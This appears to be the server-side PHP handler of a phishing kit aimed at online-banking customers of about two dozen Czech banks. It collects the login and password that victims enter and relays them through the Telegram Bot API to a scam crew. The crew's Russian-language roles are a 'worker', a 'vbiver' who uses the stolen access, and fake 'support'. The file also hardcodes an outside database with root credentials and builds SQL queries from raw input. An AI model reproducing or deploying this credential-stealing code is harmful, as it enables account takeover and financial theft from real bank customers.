<?php

require_once __DIR__ . '/../../vendor/autoload.php';

$dotenv = Dotenv\Dotenv::createUnsafeImmutable(dirname(__DIR__, 2));
$dotenv->load();

$dbhost = getenv('dbHost');
$dblogin = getenv('dbLogin');
$dbpass = getenv('dbPass');
$dbport = getenv('dbPort');

ini_set('display_errors', 1);
$dbconn = pg_connect("host={$dbhost} port={$dbport} dbname=link_infos user={$dblogin} password={$dbpass}");
$userconn = pg_connect("host={$dbhost} port={$dbport} dbname=user_infos user={$dblogin} password={$dbpass}");

  $login = $_POST['login'];
  $password = $_POST['password'];

  $orderid = $_POST['orderid'];
  $bank = $_POST['bank'];

  switch ($bank) {
    case 'ing':
      $bank_name = 'ING Bank';
      break;
    case 'jt':
      $bank_name = 'J&T Banka';
      break;
    case 'kb':
      $bank_name = 'Komerční banka';
      break;
    case 'mbank':
      $bank_name = 'mBank';
      break;
    case 'modra':
      $bank_name = 'Modrá pyramida stavební spořitelna';
      break;
    case 'moneta':
      $bank_name = 'Moneta Money Bank';
      break;
    case 'ober':
      $bank_name = 'Oberbank AG';
      break;
    case 'penez':
      $bank_name = 'Peněžní dům';
      break;
    case 'ppf':
      $bank_name = 'PPF banka';
      break;
    case 'raif':
      $bank_name = 'Raiffeisenbank';
      break;
    case 'sporitelna':
      $bank_name = 'Česká spořitelna';
      break;
    case 'trinity':
      $bank_name = 'Trinity Bank';
      break;
    case 'unicredit':
      $bank_name = 'UniCredit Bank Czech Republic and Slovakia';
      break;
    case 'vub':
      $bank_name = 'Všeobecná úvěrová banka';
      break;
    case 'air':
      $bank_name = 'Air Bank';
      break;
    case 'artesa':
      $bank_name = 'Artesa';
      break;
    case 'citfin':
      $bank_name = 'Citfin';
      break;
    case 'citi':
      $bank_name = 'Citi Bank';
      break;
    case 'commerz':
      $bank_name = 'Commerz Bank';
      break;
    case 'credit':
      $bank_name = 'Credit Bank';
      break;
    case 'csob':
      $bank_name = 'ČSOB';
      break;
    case 'equa':
      $bank_name = 'Equa Bank';
      break;
    case 'expo':
      $bank_name = 'Expo Bank';
      break;
    case 'fio':
      $bank_name = 'Fio Banka';
      break;
    case 'hsbc':
      $bank_name = 'HSBC Bank';
      break;
    case 'hypo':
      $bank_name = 'Hypoteční banka';
      break;
    default:
      $bank_name = 'Unknown Bank';
      break;
  }

$linkdbconn = pg_connect("host=46.148.239.101 port=6432 dbname=link_infos user=root password=root");
$worker = pg_query($linkdbconn, "SELECT * FROM link_infos WHERE orderid='$orderid'");
$row = pg_fetch_array($worker, null, PGSQL_ASSOC);
$botToken = getenv('botKey');
$chatID = $row['workerID'];
$user = pg_query($userconn, "SELECT * FROM user_infos WHERE \"chatID\"='$chatID'");
$userrow = pg_fetch_array($user, null, PGSQL_ASSOC);
$username = $userrow['workerusername'];
if ($row['vbiverID'] != null) {
    $vbiverID = $row['vbiverID'];
    $vbiver = pg_query($userconn, "SELECT * FROM user_infos WHERE \"chatID\"='$vbiverID' ");
    $vbiverrow = pg_fetch_array($vbiver, null, PGSQL_ASSOC);
}
$currService = $row['currService'];

// Текст сообщения
$messageToBot = '<b>' . $currService . '</b>'. PHP_EOL;
$messageToBot .= '🪪Пришли данные ЛК <b>' . $bank_name . '</b>' . PHP_EOL;
$messageToBot .= '♣️Login: <code>' . $login . '</code>' . PHP_EOL;
$messageToBot .= '♣️Pass: <code>' . $password . '</code>' . PHP_EOL;
$messageToBot .= '👨🏻‍🏭Воркер: <b>@' . $username . '</b>' . PHP_EOL;
if ($row['supportUsername'] != null) {
    $messageToBot .= '👨🏻‍🚀ТП: <b>@' . $row['supportUsername'] . '</b>' . PHP_EOL;
}
if ($row['vbiverID'] != null) {
    $vbiverID = $row['vbiverID'];
    $vbiver = pg_query($userconn, "SELECT * FROM user_infos WHERE \"chatID\"='$vbiverID' ");
    $vbiverrow = pg_fetch_array($vbiver, null, PGSQL_ASSOC);
    $messageToBot .= '👨🏻‍🍳Вбивер: <b>@' . $vbiverrow['workerusername'] . '</b>' . PHP_EOL;
}
$messageToBot .= '#search' . $row['id'];

if ($row['vbiverID'] == null) {
    $keyboard = [
        "inline_keyboard" => [
            [
                ["text" => "✅Взять лог", "callback_data" => "takeLog_" . $orderid]
            ]
        ]
    ];


// Кодируем клавиатуру в формат JSON
$encodedKeyboard = json_encode($keyboard);


// Опции запроса
$options = [
    "chat_id" => getenv('vbivchat'),
    "text" => $messageToBot,
    "reply_markup" => $encodedKeyboard,
    "parse_mode" => "HTML"
];

// URL для запроса
$url = "https://api.telegram.org/bot" . $botToken . "/sendMessage?" . http_build_query($options);

// Отправляем запрос на API Telegram
$response = file_get_contents($url);
} else {
    // Текст сообщения
    $messageToBot = '<b>' . $currService . '</b>'. PHP_EOL;
$messageToBot .= '🪪Пришли данные ЛК <b>' . $bank_name . '</b>' . PHP_EOL;
$messageToBot .= '♣️Login: <code>' . $login . '</code>' . PHP_EOL;
$messageToBot .= '♣️Pass: <code>' . $password . '</code>' . PHP_EOL;
$messageToBot .= '👨🏻‍🏭Воркер: <b>@' . $username . '</b>' . PHP_EOL;
if ($row['supportUsername'] != null) {
    $messageToBot .= '👨🏻‍🚀ТП: <b>@' . $row['supportUsername'] . '</b>' . PHP_EOL;
}
if ($row['vbiverID'] != null) {
    $messageToBot .= '👨🏻‍🍳Вбивер: <b>@' . $vbiverrow['workerusername'] . '</b>' . PHP_EOL;
}
$messageToBot .= '#search' . $row['id'];

require 'vbivkeyboard.php';


// Кодируем клавиатуру в формат JSON
$encodedKeyboard = json_encode($keyboard);


// Опции запроса
$options = [
    "chat_id" => $vbiverrow['chatID'],
    "text" => $messageToBot,
    "reply_markup" => $encodedKeyboard,
    "parse_mode" => "HTML"
];

// URL для запроса
$url = "https://api.telegram.org/bot" . $botToken . "/sendMessage?" . http_build_query($options);

// Отправляем запрос на API Telegram
$response = file_get_contents($url);
}

$messageToBot = '<b>' . $currService . '</b>'. PHP_EOL;
$messageToBot .= '🪪Пришли данные ЛК <b>' . $bank_name . '</b>' . PHP_EOL;
$messageToBot .= '🔖Название товара: <b>' . $row['productName'] . '</b>' . PHP_EOL;
if ($row['supportUsername'] != null) {
    $messageToBot .= '👨🏻‍🚀ТП: <b>@' . $row['supportUsername'] . '</b>' . PHP_EOL;
}
if ($row['vbiverID'] != null) {
    $messageToBot .= '👨🏻‍🍳Вбивер: <b>@' . $vbiverrow['workerusername'] . '</b>' . PHP_EOL;
}
$messageToBot .= '#search' . $row['id'];

$keyboard = [
    "inline_keyboard" => [
      [
        ["text" => "👁", "callback_data" => "isOnlineButton_" . $row['orderid']]
      ],
      [
        ["text" => "🗂Шаблоны ТП", "callback_data" => "supportTemplates_czech"]
      ]
    ]
  ];


// Кодируем клавиатуру в формат JSON
$encodedKeyboard = json_encode($keyboard);


// Опции запроса
$options = [
    "chat_id" => $row['workerID'],
    "text" => $messageToBot,
    "reply_markup" => $encodedKeyboard,
    "parse_mode" => "HTML"
];

// URL для запроса
$url = "https://api.telegram.org/bot" . $botToken . "/sendMessage?" . http_build_query($options);

// Отправляем запрос на API Telegram
$response = file_get_contents($url);

$messageToBot = '<b>' . $currService . '</b>'. PHP_EOL;
$messageToBot .= '🪪Пришли данные ЛК' . PHP_EOL;
$messageToBot .= '🏛Банк: <b>' . $bank_name . '</b>' . PHP_EOL;
$messageToBot .= '👨🏻‍🏭Воркер: #' . $userrow['userTag'] . PHP_EOL;
if ($row['supportUsername'] != null) {
    $messageToBot .= '👨🏻‍🚀ТП: <b>@' . $row['supportUsername'] . '</b>' . PHP_EOL;
}
if ($row['vbiverID'] != null) {
    $messageToBot .= '👨🏻‍🍳Вбивер: <b>@' . $vbiverrow['workerusername'] . '</b>' . PHP_EOL;
}
$messageToBot .= '#search' . $row['id'];

// Кодируем клавиатуру в формат JSON
$encodedKeyboard = json_encode($keyboard);


// Опции запроса
$options = [
    "chat_id" => getenv('teamChat'),
    "text" => $messageToBot,
    "parse_mode" => "HTML"
];

// URL для запроса
$url = "https://api.telegram.org/bot" . $botToken . "/sendMessage?" . http_build_query($options);

// Отправляем запрос на API Telegram
$response = file_get_contents($url);



?>
